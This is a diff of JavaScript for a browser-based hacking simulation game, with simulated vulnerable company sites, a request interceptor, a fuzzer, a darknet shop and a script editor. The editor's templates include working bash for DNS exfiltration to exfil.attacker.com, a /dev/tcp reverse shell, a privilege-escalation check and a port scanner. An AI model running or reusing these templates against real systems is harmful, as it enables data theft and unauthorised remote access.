+    content='<div class="ssec"><h3>/api/users.php '+vulnBadge('idor')+'</h3>'
+      +'<p>Returns user by ID. No auth check.</p>'
+      +'<div class="sform"><label>id</label><div style="display:flex;gap:5px">'
+      +'<input id="'+coId+'-aid" value="1" style="width:70px">'
+      +'<button class="fbtn" id="'+coId+'-api-btn">FETCH</button></div></div>'
+      +'<div id="'+coId+'-ar" style="display:none;margin-top:7px;font-size:10px;color:var(--g);font-family:Share Tech Mono,monospace;white-space:pre;background:#010801;padding:7px;"></div></div>';
+  } else if(page==='contact'){
+    content='<div class="ssec"><h3>Contact '+vulnBadge('xss')+'</h3>'
+      +'<p>'+co.name+' &mdash; contact via form below.</p></div>'
+      +'<div class="ssec"><h3>Message (stored)</h3>'
+      +'<div class="sform"><label>Name</label><input id="'+coId+'-cn" autocomplete="off">'
+      +'<label>Message</label><textarea id="'+coId+'-cm" style="height:55px"></textarea>'
+      +'<button class="fbtn" id="'+coId+'-submit">SEND</button><div id="'+coId+'-cr"></div></div></div>';
+  } else if(page==='services'||page==='about'||page==='operations'||page==='compliance'||page==='contracts'||page==='careers'){
+    content='<div class="ssec"><h3>'+page.charAt(0).toUpperCase()+page.slice(1)+'</h3>'
+      +'<p>'+co.industry+' &mdash; '+co.name+'.</p>'
+      +(page==='about'?'<p>Security posture: FW='+(co.sec.fw?'Yes':'No')+' IDS='+(co.sec.ids?'Yes':'No')+' WAF='+(co.sec.waf?'Yes':'No')+'</p>':'')
+      +'</div>';
+  } else if(page==='plans'||page==='support'||page==='datacenter'||page==='pipeline'){
+    content='<div class="ssec"><div class="salert warn">&#x26A0; '+page.charAt(0).toUpperCase()+page.slice(1)+' -- '+(loggedIn?'access granted':'authentication required')+'</div></div>';
+  }
+  return '<div class="site-wrap">'
+    +'<div class="site-hdr"><div class="site-name">'+co.name+'</div><div class="site-domain">http://'+co.domain+'</div></div>'
+    +'<div class="site-nav" data-site="'+coId+'">'+nav+'</div>'
+    +content+'</div>';
+}
+
+function browserGo(){
+  var url=document.getElementById('browser-url').value.trim();if(!url)return;
+  if(url.includes('.onion')||url.includes('darknet')){
+    document.getElementById('browser-body').innerHTML='<div class="site-wrap"><div class="site-hdr"><div class="site-name" style="color:var(--red)">DARKNET MARKET</div></div><div class="ssec"><p style="color:var(--textd)">Balance: \u20BF'+(G?G.credits:0)+'</p><button class="fbtn" id="ds-btn">OPEN SHOP</button></div></div>';
+    document.getElementById('ds-btn').addEventListener('click',openShopModal);return;
+  }
+  var co=COMPANIES.find(function(c){return url.includes(c.domain)||url.includes(c.ip);});
+  if(!co||!G||G.discovered.indexOf(co.id)<0){
+    document.getElementById('browser-body').innerHTML='<div style="padding:20px;color:var(--red)">ERR_CONNECTION_REFUSED<br><span style="font-size:9px;color:var(--textd)">Host not discovered or unreachable. Run scan + nmap first.</span></div>';return;
+  }
+  curSite=co.id;
+  var segs=url.split('/').filter(function(p){return p&&!p.includes('.')&&!p.includes(':');});
+  var pg=segs.pop()||'home';
+  var valid=(co.webPages||['home','portal']).indexOf(pg)>=0?pg:'home';
+  setTimeout(function(){browserLoad(co.id,valid);},200);
+}
+
+function browserLoad(coId,page){
+  curSite=coId;curPage=page;
+  var co=COMPANIES.find(function(c){return c.id===coId;});if(!co)return;
+  document.getElementById('browser-url').value='http://'+co.domain+'/'+page;
+  if(G&&G.interceptMode){
+    var req='GET /'+page+' HTTP/1.1\nHost: '+co.domain+'\nCookie: PHPSESSID=a3f921bc847d\nUser-Agent: Mozilla/5.0';
+    document.getElementById('icpt-req').textContent=req;
+    document.getElementById('icpt-edit').value=req;
+  }
+  var body=document.getElementById('browser-body');
+  body.innerHTML=buildSiteContent(coId,page);
+  // nav links
+  body.querySelectorAll('[data-pg]').forEach(function(el){el.addEventListener('click',function(){browserLoad(coId,this.getAttribute('data-pg'));});});
+  body.querySelectorAll('[data-term]').forEach(function(el){el.addEventListener('click',function(){termExec(this.getAttribute('data-term'));switchPane('terminal');});});
+  // login button (generic pattern: coId-login)
+  var loginBtn=document.getElementById(coId+'-login');
+  if(loginBtn){loginBtn.addEventListener('click',function(){
+    webLogin(coId,document.getElementById(coId+'-u').value,document.getElementById(coId+'-p').value,coId+'-lr','portal');
+  });}
+  // api button
+  var apiBtn=document.getElementById(coId+'-api-btn');
+  if(apiBtn){apiBtn.addEventListener('click',function(){
+    var id=parseInt(document.getElementById(coId+'-aid').value)||1;
+    var creds=co.creds||{};var users=Object.keys(creds);
+    var u=id<=users.length?{id:id,username:users[id-1],role:id===1?'admin':'operator'}:null;
+    var el=document.getElementById(coId+'-ar');
+    el.style.display='block';el.textContent=u?JSON.stringify(u,null,2):'{"error":"user not found"}';
+    if(u&&id>1){
+      tPrint('ok','[IDOR] Retrieved user '+id+' without auth: '+u.username);
+      if(!G._idorRewarded)G._idorRewarded={};
+      var idorKey=coId+':'+id;
+      if(!G._idorRewarded[idorKey]){
+        G._idorRewarded[idorKey]=true;
+        G.credits+=15;tPrint('ok','[+] IDOR discovery: +\u20BF15');renderTopbar();saveGame();
+      }
+    }
+  });}
+  // contact/xss
+  var submitBtn=document.getElementById(coId+'-submit');
+  if(submitBtn){submitBtn.addEventListener('click',function(){
+    var msg=(document.getElementById(coId+'-cm')||{}).value||'';
+    var el=document.getElementById(coId+'-cr');
+    var SCRTAG='\u003cscript\u003e';
+    if(msg.toLowerCase().includes(SCRTAG)||msg.toLowerCase().includes('javascript:')){
+      el.innerHTML='<div class="salert warn">&#x26A0; XSS detected -- script executes when admin views messages</div>';
+      tPrint('warn','[XSS] Stored XSS in contact form on '+co.domain+' confirmed');
+    } else {el.innerHTML='<div class="salert ok">Message sent.</div>';}
+  });}
+}
+
+function webLogin(coId,user,pass,resultId,redirect){
+  var co=COMPANIES.find(function(c){return c.id===coId;});if(!co)return;
+  var el=document.getElementById(resultId);
+  if(co.creds&&co.creds[user]===pass){
+    if(el)el.innerHTML='<div class="salert ok">&#x2713; Login successful</div>';
+    if(!G.pwned[co.id])G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[co.id].hasShell=true;
+    G.session={connected:true,targetId:co.id,user:user,cwd:'/',isRoot:user==='root'||user==='Administrator'};
+    if(!G.pwned[co.id]||!G.pwned[co.id].webRewarded){
+      if(!G.pwned[co.id])G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+      G.pwned[co.id].webRewarded=true;
+      G.credits+=40;tPrint('ok','[Browser] Auth bonus: +\u20BF40 (first login)');renderTopbar();
+    }
+    updatePrompt();renderFS();saveGame();
+    setTimeout(function(){browserLoad(coId,redirect||'portal');},700);
+    tPrint('ok','[Browser] Authenticated as '+user+'@'+co.domain);
+  } else {
+    if(el)el.innerHTML='<div class="salert err">&#x2717; Invalid credentials</div>';
+    if(user&&(user.includes("'")&&user.toUpperCase().includes('OR')))tPrint('warn','[Browser] SQLi pattern detected -- use INTERCEPT or exploit sqli '+co.ip);
+  }
+}
+
+function toggleIntercept(){
+  if(!G)return;G.interceptMode=!G.interceptMode;
+  document.getElementById('btn-icpt').classList.toggle('atool',G.interceptMode);
+  document.getElementById('icpt-panel').classList.toggle('active',G.interceptMode);
+}
+function sendModified(){
+  var m=document.getElementById('icpt-edit').value;
+  tPrint('sys','[Intercept] Sending modified request...');
+  var SCRTAG='\u003cscript\u003e';
+  if(m.includes("'")&&m.toUpperCase().includes('OR')){tPrint('ok','[+] SQLi detected -- auth bypassed!');toast('[+] SQLi via intercept!');}
+  else if(m.toLowerCase().includes(SCRTAG)){tPrint('ok','[+] XSS payload detected in request');}
+  else tPrint('dim','[Intercept] Request sent (no injection detected).');
+}
+function openCurlBuilder(){
+  var co=curSite?COMPANIES.find(function(c){return c.id===curSite;}):null;
+  openModal('cURL BUILDER',
+    '<select id="cm" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:3px;margin-bottom:6px;width:100%"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option></select>'
+    +'<label style="font-size:9px;color:var(--textd)">URL</label>'
+    +'<input id="cu" value="http://'+(co?co.domain:'target')+'/login.php" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;margin-bottom:5px;outline:none;">'
+    +'<label style="font-size:9px;color:var(--textd)">Headers (one per line)</label>'
+    +'<textarea id="ch" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;height:50px;outline:none;resize:vertical;margin-bottom:5px;" placeholder="X-Forwarded-For: 127.0.0.1"></textarea>'
+    +'<label style="font-size:9px;color:var(--textd)">Body</label>'
+    +'<textarea id="cb" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;height:50px;outline:none;resize:vertical;" placeholder="username=admin&password=x"></textarea>'
+    +'<button class="t-btn sm" id="curl-send" style="margin-top:7px">SEND REQUEST</button>'
+    +'<div id="cr" style="margin-top:7px;font-size:10px;font-family:Share Tech Mono,monospace;color:var(--g);white-space:pre-wrap;border:1px solid var(--border);padding:5px;margin-top:5px;"></div>'
+  );
+  document.getElementById('curl-send').addEventListener('click',function(){
+    var body=document.getElementById('cb').value||'',url=document.getElementById('cu').value||'';
+    var hdrs=document.getElementById('ch').value||'';
+    var resp='HTTP/1.1 200 OK\nServer: Apache/2.2.34\n\n';
+    if(body.includes("'")&&body.toUpperCase().includes('OR'))resp+='[SQLi] Auth bypassed -- welcome admin!';
+    else if(hdrs.includes('127.0.0.1'))resp+='[AUTH BYPASS] X-Forwarded-For accepted';
+    else if(url.includes('../'))resp+='[LFI] File contents returned';
+    else resp+='200 OK -- normal response';
+    document.getElementById('cr').textContent=resp;
+  });
+}
+function openFuzzer(){
+  if(!curSite){toast('Navigate to a site first','w');return;}
+  var co=COMPANIES.find(function(c){return c.id===curSite;});
+  openModal('FORM FUZZER',
+    '<div style="font-size:10px;color:var(--textd);margin-bottom:7px">Auto-tests all input fields for common web vulnerabilities.</div>'
+    +'<input id="furl" value="http://'+(co?co.domain:'target')+'/login.php" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;margin-bottom:7px;outline:none;">'
+    +'<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:7px;font-size:9px;color:var(--textd);">'
+    +'<label><input type="checkbox" id="fz-sqli" checked> SQLi</label>'
+    +'<label><input type="checkbox" id="fz-xss" checked> XSS</label>'
+    +'<label><input type="checkbox" id="fz-lfi"> LFI</label>'
+    +'<label><input type="checkbox" id="fz-idor"> IDOR</label></div>'
+    +'<button class="t-btn sm" id="fuzz-run">RUN FUZZER</button>'
+    +'<div id="fres" style="margin-top:9px;font-size:10px;font-family:Share Tech Mono,monospace;"></div>'
+  );
+  document.getElementById('fuzz-run').addEventListener('click',function(){
+    var vulns=co?(co.webVulns||[]):[];
+    var fres=document.getElementById('fres');
+    fres.innerHTML='<span style="color:var(--textd)">[*] Fuzzing inputs...</span>';
+    setTimeout(function(){
+      var checks=[
+        {id:'fz-sqli',label:'SQLi',col:'var(--orange)',found:vulns.indexOf('sqli')>=0||vulns.indexOf('sqli-blind')>=0},
+        {id:'fz-xss', label:'XSS', col:'var(--purple)',found:vulns.indexOf('xss')>=0},
+        {id:'fz-lfi', label:'LFI', col:'var(--yellow)',found:vulns.indexOf('lfi')>=0},
+        {id:'fz-idor',label:'IDOR',col:'var(--cyan)',  found:vulns.indexOf('idor')>=0},
+      ];
+      fres.innerHTML=checks.map(function(c){
+        var el=document.getElementById(c.id);
+        if(!el||!el.checked)return '';
+        return c.found?'<div style="color:'+c.col+'">[VULNERABLE] '+c.label+' detected</div>'
+                      :'<div style="color:var(--textd)">[ CLEAN ] '+c.label+'</div>';
+      }).join('');
+    },1500);
+  });
+}
+function openCookies(){
+  openModal('COOKIE INSPECTOR',
+    '<table class="stbl"><tr><th>Name</th><th>Value</th><th>Flags</th></tr>'
+    +'<tr><td>PHPSESSID</td><td>a3f921bc847d</td><td style="color:var(--red)">No HttpOnly</td></tr>'
+    +'<tr><td>user_role</td><td>operator</td><td style="color:var(--red)">No Secure flag</td></tr>'
+    +'</table>'
+    +'<div style="margin-top:8px;font-size:9px;color:var(--textd)">No HttpOnly = XSS can steal cookie<br>user_role client-side = try changing to "admin"</div>'
+    +'<label style="font-size:9px;color:var(--textd);margin-top:8px;display:block">Edit cookie value</label>'
+    +'<input id="ce" value="a3f921bc847d" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;margin:3px 0;outline:none;">'
+    +'<button class="t-btn sm" id="cookie-set">SET COOKIE</button>'
+  );
+  document.getElementById('cookie-set').addEventListener('click',function(){toast('Cookie modified');});
+}
+function openDiff(){
+  openModal('RESPONSE DIFF VIEWER',
+    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:7px;">'
+    +'<div><div style="font-size:9px;color:var(--textd);margin-bottom:3px">BASELINE</div>'
+    +'<div style="background:#020a02;border:1px solid var(--border);padding:7px;font-size:9px;color:#88bb88;height:130px;overflow-y:auto;font-family:Share Tech Mono,monospace;white-space:pre">HTTP/1.1 200 OK\nContent-Length: 2847\n\n&lt;p&gt;Invalid credentials.&lt;/p&gt;</div></div>'
+    +'<div><div style="font-size:9px;color:var(--orange);margin-bottom:3px">MODIFIED (SQLi)</div>'
+    +'<div style="background:#1a0800;border:1px solid var(--orange);padding:7px;font-size:9px;color:var(--orange);height:130px;overflow-y:auto;font-family:Share Tech Mono,monospace;white-space:pre">HTTP/1.1 200 OK\nContent-Length: 8241\n\n&lt;p&gt;Welcome, admin!&lt;/p&gt;</div></div>'
+    +'</div><div style="margin-top:7px;font-size:9px;color:var(--g)">Diff: +5394 bytes. Different page served -- SQLi confirmed.</div>'
+  );
+}
+
+
+// ====== MODALS ======
+function openModal(title,html){document.getElementById('modal-title').textContent=title;document.getElementById('modal-body').innerHTML=html;document.getElementById('modal-bg').classList.add('on');}
+function closeModal(){document.getElementById('modal-bg').classList.remove('on');}
+
+function showTargetModal(coId){
+  var co=COMPANIES.find(function(c){return c.id===coId;});if(!co)return;
+  var pw=G.pwned[coId]||{},recon=G.reconDone[coId]||{};
+  var html='<div style="margin-bottom:9px">'
+    +'<div style="font-size:14px;color:var(--g);font-family:VT323,monospace">'+co.name+'</div>'
+    +'<div style="font-size:9px;color:var(--textd)">'+co.ip+' &middot; '+co.domain+' &middot; '+co.industry+'</div></div>'
+    +'<div style="font-size:10px;color:#88bb88;margin-bottom:9px">'+co.desc+'</div>'
+    +'<div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:5px;margin-bottom:9px;font-size:9px;">'
+    +['fw','ids','waf','mfa'].map(function(k){return '<div>'+k.toUpperCase()+': <span style="color:'+(co.sec[k]?'var(--red)':'var(--g)')+'">'+  (co.sec[k]?'YES':'NO')+'</span></div>';}).join('')
+    +'</div>'
+    +'<div style="font-size:9px;color:var(--textd);margin-bottom:3px">OPEN PORTS:</div>'
+    +'<div style="font-size:9px;font-family:Share Tech Mono,monospace;margin-bottom:8px;">'
+    +co.ports.map(function(p){return '<div style="color:'+(p.vuln&&p.vuln!=='none'?'var(--orange)':'var(--textd)')+'">'+p.num+'/'+p.svc+' '+p.ver+(p.vuln&&p.vuln!=='none'?' ['+p.vuln+']':'')+'</div>';}).join('')
+    +'</div>'
+    +'<div style="font-size:9px;color:var(--textd);margin-bottom:3px">RECON DONE:</div>'
+    +'<div style="font-size:9px;margin-bottom:9px;display:flex;gap:8px;">'
+    +['ping','nmap','gobuster','sniffer'].map(function(r){return '<span style="color:'+(recon[r]?'var(--g)':'var(--textd)')+'">'+r+'</span>';}).join('')
+    +'</div>'
+    +'<div style="font-size:9px;color:var(--textd);margin-bottom:3px">CONTRACTS:</div>'
+    +(co.contracts||[]).map(function(ct){
+      var st=G.contracts[ct.id];
+      return '<div style="font-size:10px;color:'+(st==='complete'?'#00ff88':st==='inactive'?'var(--textd)':'var(--yellow)')+';margin:2px 0;">'
+        +(st==='complete'?'\u2713':st==='inactive'?'\uD83D\uDD12':'\u25CF')+' '+ct.title+' \u2014 \u20BF'+ct.reward.c+' +'+ct.reward.r+'REP</div>';
+    }).join('')
+
+    +'<div style="display:flex;gap:5px;margin-top:12px;flex-wrap:wrap;">'
+    +'<button class="t-btn sm" id="tm-browse">BROWSE</button>'
+    +'<button class="t-btn sm" id="tm-nmap">NMAP</button>'
+    +'<button class="t-btn sm" id="tm-sniff">SNIFFER</button>'
+    +(pw.hasRoot?'<button class="t-btn sm" id="tm-miner">DEPLOY MINER</button>':'')
+    +'</div>';
+  openModal('TARGET: '+co.name,html);
+  document.getElementById('tm-browse').addEventListener('click',function(){closeModal();browserLoad(coId,'home');switchPane('browser');});
+  document.getElementById('tm-nmap').addEventListener('click',function(){closeModal();termExec('nmap -sV -sC '+co.ip);switchPane('terminal');});
+  document.getElementById('tm-sniff').addEventListener('click',function(){closeModal();termExec('deploy sniffer '+co.ip);switchPane('terminal');});
+  var mb=document.getElementById('tm-miner');if(mb)mb.addEventListener('click',function(){closeModal();termExec('deploy miner '+co.ip);switchPane('terminal');});
+}
+
+function openShopModal(){
+  var cats={network:'&#x1F517; Network',recon:'&#x1F50D; Recon',exploit:'&#x1F4A5; Exploit',webexpl:'&#x1F310; Web',post:'&#x2699; Post',persist:'&#x1F517; Persist',exfil:'&#x1F4E4; Exfil',opsec:'&#x1F6E1; OPSEC',mining:'&#x26CF; Mining'};
+  var html='<div style="font-size:10px;color:var(--textd);margin-bottom:9px">Balance: <span style="color:var(--yellow)">\u20BF'+G.credits+'</span> &nbsp; REP: <span style="color:var(--g)">'+G.rep+'</span></div>';
+  Object.entries(cats).forEach(function(kv){
+    var cat=kv[0],label=kv[1];
+    var items=SHOP.filter(function(i){return i.cat===cat;});if(!items.length)return;
+    html+='<div style="font-size:9px;letter-spacing:2px;color:var(--textd);margin:9px 0 5px;border-bottom:1px solid var(--border);padding-bottom:2px">'+label+'</div>';
+    items.forEach(function(item){
+      var owned=G.tools.indexOf(item.id)>=0;
+      var can=G.credits>=item.cost.c&&G.rep>=item.cost.r;
+      html+='<div style="display:flex;gap:7px;align-items:flex-start;background:var(--bg2);border:1px solid var(--border);padding:8px;margin-bottom:5px;">'
+        +'<div style="font-size:18px;flex-shrink:0">'+item.icon+'</div>'
+        +'<div style="flex:1"><div style="color:var(--g);font-size:12px;margin-bottom:1px">'+item.name+'</div>'
+        +'<div style="color:var(--textd);font-size:9px;line-height:1.5;margin-bottom:3px">'+item.desc+'</div>'
+        +'<div style="font-size:9px;color:var(--textd)">\u20BF'+item.cost.c+(item.cost.r>0?' &middot; '+item.cost.r+' REP':'')+'</div></div>'
+        +(owned?'<button style="padding:4px 8px;background:var(--border);border:1px solid var(--textd);color:var(--textd);font-family:Share Tech Mono,monospace;font-size:9px;cursor:default;flex-shrink:0;">OWNED</button>'
+                :'<button data-buy="'+item.id+'" style="padding:4px 8px;background:'+(can?'var(--gdim)':'#1a0000')+';border:1px solid '+(can?'var(--g2)':'var(--textdd)')+';color:'+(can?'var(--g)':'var(--textd)')+';font-family:Share Tech Mono,monospace;font-size:9px;cursor:'+(can?'pointer':'not-allowed')+';flex-shrink:0;">'+(can?'BUY':'LOCKED')+'</button>')
+        +'</div>';
+    });
+  });
+  openModal('DARKNET SHOP',html);
+  document.getElementById('modal-body').querySelectorAll('[data-buy]').forEach(function(btn){btn.addEventListener('click',function(){buyTool(this.getAttribute('data-buy'));});});
+}
+
+function buyTool(id){
+  var item=SHOP.find(function(i){return i.id===id;});
+  if(!item||G.tools.indexOf(id)>=0)return;
+  if(G.credits<item.cost.c){toast('Need \u20BF'+item.cost.c+' credits','e');return;}
+  if(G.rep<item.cost.r){toast('Need '+item.cost.r+' REP','e');return;}
+  G.credits-=item.cost.c;G.tools.push(id);saveGame();renderTopbar();
+  toast('\u2713 '+item.name+' installed');
+  // If miner-pool bought, update existing miner rates
+  if(id==='miner-pool'&&G.miners){
+    Object.keys(G.miners).forEach(function(mid){
+      var rates={easy:8,med:18,hard:35,elite:80};
+      G.miners[mid].rate=rates[G.miners[mid].diff]||10;
+      G.miners[mid].rate=Math.floor(G.miners[mid].rate*2);
+    });
+    tPrint('ok','[Mining Pool] All miner rates doubled!');
+  }
+  closeModal();openShopModal();
+}
+
+function openEditorModal(){
+  var templates={
+    'port-scanner':'#!/bin/bash\nTARGET=${1:-192.168.10.14}\nfor port in 21 22 80 443 3306 8080 6379 27017; do\n  (echo >/dev/tcp/$TARGET/$port) 2>/dev/null && echo "[+] $TARGET:$port open"\ndone',
+    'priv-check':'#!/bin/bash\necho "=== SUDO ===" && sudo -l 2>/dev/null\necho "=== SUID ===" && find / -perm -4000 2>/dev/null | head -20\necho "=== CRON ===" && cat /etc/crontab 2>/dev/null\necho "=== WRITABLE ===" && find /etc -writable 2>/dev/null | head -10',
+    'exfil-dns':'#!/bin/bash\nFILE=$1 DOMAIN=exfil.attacker.com\nDATA=$(base64 "$FILE" | tr -d "\\n")\nfor chunk in $(echo $DATA | fold -w 63); do\n  host "${chunk}.${DOMAIN}" >/dev/null 2>&1\ndone\necho "[+] Exfil complete via DNS"',
+    'rev-shell':'#!/bin/bash\n# Replace IP/PORT with your listener\nbash -i >& /dev/tcp/10.0.0.2/4444 0>&1',
+  };
+  if(!G.scripts)G.scripts=[];
+  openModal('SCRIPT EDITOR',
+    '<div style="display:flex;gap:5px;margin-bottom:5px;flex-wrap:wrap;">'
+    +'<select id="et" style="background:#000;border:1px solid var(--border2);color:var(--textd);font-family:Share Tech Mono,monospace;font-size:9px;padding:3px;"><option value="">-- Template --</option>'
+    +Object.keys(templates).map(function(k){return '<option value="'+k+'">'+k+'</option>';}).join('')+'</select>'
+    +'<input id="en" value="my-script" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:3px;flex:1;outline:none;min-width:80px;">'
+    +'<button class="t-btn sm" id="ed-save">SAVE</button>'
+    +'<button class="t-btn sm" id="ed-test">DRY RUN</button></div>'
+    +'<textarea id="ec" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off" style="width:100%;height:180px;background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:11px;padding:7px;outline:none;resize:vertical;line-height:1.6;">#!/bin/bash\necho "Script running"</textarea>'
+    +'<div style="font-size:9px;color:var(--textd);margin-top:5px">Saved: '+G.scripts.length+' scripts &middot; Run with: run &lt;name&gt;</div>'
+  );
+  document.getElementById('et').addEventListener('change',function(){var v=this.value;if(templates[v]){document.getElementById('ec').value=templates[v];document.getElementById('en').value=v;}});
+  document.getElementById('ed-save').addEventListener('click',function(){
+    var name=(document.getElementById('en').value||'script').replace(/\s/g,'-');
+    var code=document.getElementById('ec').value||'';
+    var idx=G.scripts.findIndex(function(s){return s.name===name;});
+    if(idx>=0)G.scripts[idx]={name:name,code:code};else G.scripts.push({name:name,code:code});
+    saveGame();renderFS();toast('\u2713 Saved: '+name);
+  });
+  document.getElementById('ed-test').addEventListener('click',function(){
+    var code=document.getElementById('ec').value||'';
+    tPrint('sys','[DRY RUN] '+(document.getElementById('en').value||'script'));
+    code.split('\n').filter(function(l){return l.trim()&&!l.trim().startsWith('#');}).slice(0,5).forEach(function(l){tPrint('dim','  '+l);});
+    tPrint('ok','[DRY RUN] Complete.');
+    switchPane('terminal');closeModal();
+  });
+}
+
+
+// ====== PANE / TOAST / UTIL ======
+function switchPane(name){
+  document.querySelectorAll('.tab').forEach(function(t){t.classList.toggle('on',t.getAttribute('data-pane')===name);});
+  document.querySelectorAll('.pane').forEach(function(p){p.classList.toggle('on',p.id==='pane-'+name);});
+  if(name==='terminal')setTimeout(termFocus,80);
+  if(name==='network'){setTimeout(renderNetmap,50);}
+  if(name==='cve')renderCveDb();
+  if(name==='fs')renderFS();
+}
+var _toastQ=[];
+function toast(msg,type){
+  _toastQ.push({msg:msg,type:type});
+  if(_toastQ.length===1)_showNextToast();
+}
+function _showNextToast(){
+  if(!_toastQ.length)return;
+  var t=_toastQ[0];
+  var el=document.createElement('div');
+  el.className='toast'+(t.type?' '+t.type:'');
+  el.textContent=t.msg;
+  // stack above any existing toasts
+  var existing=document.querySelectorAll('.toast');
+  var offset=existing.length*40;
+  el.style.bottom=(10+offset)+'px';
+  document.body.appendChild(el);
+  setTimeout(function(){
+    el.remove();
+    _toastQ.shift();
+    _showNextToast();
+  },2200);
+}
+function cmdHostname(args){
+  if(!args[0]){tPrint('',G.hostname||'nb');return;}
+  var hn=args[0].replace(/[^a-zA-Z0-9-]/g,'').substring(0,32);
+  if(!hn){tPrint('err','Invalid hostname');return;}
+  G.hostname=hn;updatePrompt();saveGame();tPrint('ok','Hostname set to: '+hn);
+}
+
+// ====== LINUX-AUTHENTIC COMMANDS ======
+function cmdGrep(args,s,t){
+  var flags=args.filter(function(a){return a.startsWith('-');});
+  var nonFlags=args.filter(function(a){return !a.startsWith('-');});
+  var pattern=nonFlags[0],filepath=nonFlags[1];
+  if(!pattern){tPrint('err','Usage: grep [flags] <pattern> [file]');return;}
+  var recursive=flags.indexOf('-r')>=0||flags.indexOf('-R')>=0;
+  var insensitive=flags.indexOf('-i')>=0;
+  if(!filepath&&!recursive){tPrint('err','grep: missing file operand');return;}
+  if(!s.connected||!t){tPrint('err','grep: not connected to target');return;}
+  var re;try{re=new RegExp(pattern,insensitive?'i':'');}catch(e){tPrint('err','grep: invalid pattern');return;}
+  var matched=false;
+  Object.entries(t.fc||{}).forEach(function(kv){
+    var path=kv[0],content=kv[1];
+    if(!recursive&&filepath&&!path.endsWith(filepath))return;
+    content.split('\n').forEach(function(line,i){
+      if(re.test(line)){
+        tPrint('ok',(recursive?path+':':'')+(flags.indexOf('-n')>=0?(i+1)+':':'')+line);
+        matched=true;
+      }
+    });
+  });
+  if(!matched)tPrint('dim','(no matches)');
+}
+function cmdFind(args,s,t){
+  if(!s.connected||!t){tPrint('err','find: not connected to target');return;}
+  var nameFlag=args.indexOf('-name');
+  var pattern=nameFlag>=0?args[nameFlag+1]:'*';
+  var re=new RegExp('^'+pattern.replace(/\*/g,'.*').replace(/\?/g,'.')+'$');
+  var results=[];
+  Object.keys(t.fs).forEach(function(dir){
+    (t.fs[dir]||[]).forEach(function(e){
+      if(re.test(e))results.push((dir==='/'?'/':dir+'/')+e);
+    });
+  });
+  if(!results.length){tPrint('dim','(no results)');return;}
+  results.forEach(function(r){tPrint('',r);});
+}
+function cmdUname(args,s,t){
+  var all=args.indexOf('-a')>=0;
+  if(s.connected&&t){
+    var isWin=t.ip.startsWith('172.16')||t.ip.startsWith('172.31');
+    if(isWin){tPrint('','Windows Server 2019 10.0.17763');return;}
+    tPrint('',all?'Linux '+t.domain+' 5.4.0-182-generic #202-Ubuntu SMP x86_64 GNU/Linux':'Linux');
+  } else {
+    tPrint('',all?'Linux '+(G.hostname||'nb')+' 5.15.0-kali3-amd64 x86_64 GNU/Linux':'Linux');
+  }
+}
+function cmdPs(s,t){
+  if(s.connected&&t){
+    tPrint('pre','  PID TTY          TIME CMD');
+    tPrint('pre','    1 ?        00:00:02 systemd');
+    tPrint('pre','  412 ?        00:00:00 sshd');
+    tPrint('pre',' 1337 pts/0    00:00:00 bash');
+    tPrint('pre',' 1338 pts/0    00:00:00 ps');
+    if(s.isRoot)tPrint('pre','  188 ?        00:00:01 cron');
+  } else {
+    tPrint('pre','  PID TTY          TIME CMD');
+    tPrint('pre',' 1001 pts/0    00:00:00 bash');
+  }
+}
+function cmdIfconfig(s,t){
+  if(s.connected&&t){
+    tPrint('pre','eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500');
+    tPrint('pre','        inet '+t.ip+'  netmask 255.255.255.0');
+    tPrint('pre','        ether 02:42:ac:11:00:02  txqueuelen 0');
+    tPrint('pre','lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536');
+    tPrint('pre','        inet 127.0.0.1  netmask 255.0.0.0');
+  } else {
+    tPrint('pre','eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500');
+    tPrint('pre','        inet 10.0.0.2  netmask 255.255.255.0');
+    tPrint('pre','        ether 02:42:0a:00:00:02');
+  }
+}
+function cmdIp(args,s,t){
+  if(args[0]==='a'||args[0]==='addr'||args[0]==='address'||!args[0]){cmdIfconfig(s,t);}
+  else if(args[0]==='r'||args[0]==='route'){
+    if(s.connected&&t)tPrint('pre','default via '+t.ip.split('.').slice(0,3).join('.')+'.1 dev eth0\n'+t.ip.split('.').slice(0,3).join('.')+'.0/24 dev eth0');
+    else tPrint('pre','default via 10.0.0.1 dev eth0\n10.0.0.0/24 dev eth0');
+  } else tPrint('dim','ip: unknown subcommand. Try: ip a  ip route');
+}
+function cmdEnv(s,t){
+  var user=s.connected?s.user:(G?G.handle:'user');
+  tPrint('pre','USER='+user);
+  tPrint('pre','HOME=/home/'+user);
+  tPrint('pre','SHELL=/bin/bash');
+  tPrint('pre','PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
+  tPrint('pre','TERM=xterm-256color');
+  tPrint('pre','LANG=en_US.UTF-8');
+  if(s.connected&&s.isRoot)tPrint('pre','SUDO_USER='+user);
+}
+function cmdSudo(args,s,t){
+  if(!s.connected||!t){tPrint('err','sudo: not on a target host');return;}
+  if(s.isRoot){
+    if(args.length)tPrint('dim','sudo: already root -- running: '+args.join(' '));
+    else tPrint('dim','sudo: already root');
+    return;
+  }
+  tPrint('err','[sudo] password for '+s.user+':');
+  after(600,function(){
